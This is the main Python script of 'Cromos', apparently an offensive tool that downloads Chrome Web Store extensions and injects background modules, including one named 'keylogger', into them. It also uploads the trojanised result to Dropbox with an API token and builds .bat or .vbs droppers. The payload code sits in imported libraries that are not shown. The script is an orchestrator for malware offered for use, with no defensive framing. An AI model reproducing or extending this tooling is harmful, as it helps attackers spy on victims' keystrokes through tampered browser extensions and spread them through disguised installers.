#!/usr/bin/python

import argparse
import sys
from libs.download import Download
from libs.drive import Drive
from libs.build import Build
from libs.colors import Colors
from libs.loader import Loader



def main() :

	
	global color

	color = Colors()

	def banner() : 

		banner = """
         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
	 """
		print("\r{}".format(banner))
		print("Version: {} Builds: {} Modules: {}\t\n".center(49, " ").format(color.status("1.0"), color.status(2), color.status(2)))

	def help () :

		global extension, builds, token, modules

		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str)
		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
		parser.add_argument('--build', help='Build types .bat\n.vbs', type=str)
		parser.add_argument('--token', help='Token for uploading files in Dropbox', type=str)

		args = parser.parse_args()

		extension = args.extension # Extensao ID
		modules = args.load 
		token = args.token # API key par ao dropbox
		builds = args.build 

		if len(sys.argv) < 2:
			banner()
			parser.print_help()
	
	banner()
	help()

	if extension:
		download = Download(extension)

	if modules == "currency" or modules == "keylogger" :
		loader = Loader(extension, modules).inject()

	if token:
		if not len(token) == 64:
			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
			sys.exit(1)
		else :
			if builds == "bat" or builds == "vbs":
				Drive(extension, token).upload()
				pass
			
if __name__== "__main__" :

	main()